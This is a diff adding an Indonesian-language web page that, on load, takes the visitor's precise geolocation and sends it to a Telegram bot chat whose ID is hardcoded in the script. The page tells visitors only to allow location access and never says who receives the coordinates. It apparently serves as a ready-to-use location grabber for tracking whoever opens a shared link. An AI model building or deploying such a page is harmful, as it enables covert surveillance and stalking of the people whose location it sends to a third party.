@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ambil Lokasi</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px 20px; background: #f5f5f5; }
+        .card { background: #fff; max-width: 420px; margin: auto; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); }
+        h1 { font-size: 22px; margin-bottom: 8px; }
+        p { color: #666; font-size: 14px; }
+        #status { margin-top: 20px; font-weight: bold; font-size: 15px; }
+        .ok { color: #16a34a; }
+        .err { color: #dc2626; }
+        .loading { color: #2563eb; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>📍 Mengambil Lokasi Anda...</h1>
+        <p>Harap izinkan akses lokasi jika diminta oleh browser.</p>
+        <div id="status" class="loading">Menunggu izin lokasi...</div>
+    </div>
+
+    <script>
+        // ==== ISI DI SINI ====
+        const BOT_TOKEN = 'TOKEN_ANDA_DISINI';
+        const CHAT_ID   = '1354234561';
+        // ====================
+
+        const statusDiv = document.getElementById('status');
+
+        function setStatus(text, cls) {
+            statusDiv.innerText = text;
+            statusDiv.className = cls || '';
+        }
+
+        function kirimLokasiKeTelegram(latitude, longitude) {
+            setStatus('Lokasi ditemukan. Mengirim ke Telegram...', 'loading');
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${latitude}&longitude=${longitude}`;
+
+            fetch(url, { method: 'GET', mode: 'no-cors' })
+                .then(() => {
+                    setStatus('✅ Permintaan lokasi telah dikirim. Cek bot Telegram Anda.', 'ok');
+                })
+                .catch(err => {
+                    setStatus('❌ Gagal mengirim lokasi. Periksa koneksi.', 'err');
+                    console.error(err);
+                });
+        }
+
+        function ambilLokasi() {
+            if (!navigator.geolocation) {
+                setStatus('❌ Browser tidak mendukung Geolocation.', 'err');
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    kirimLokasiKeTelegram(pos.coords.latitude, pos.coords.longitude);
+                },
+                err => {
+                    setStatus(`❌ Gagal mendapatkan lokasi: ${err.message}`, 'err');
+                },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+        }
+
+        window.onload = ambilLokasi;
+    </script>
+</body>
+</html>
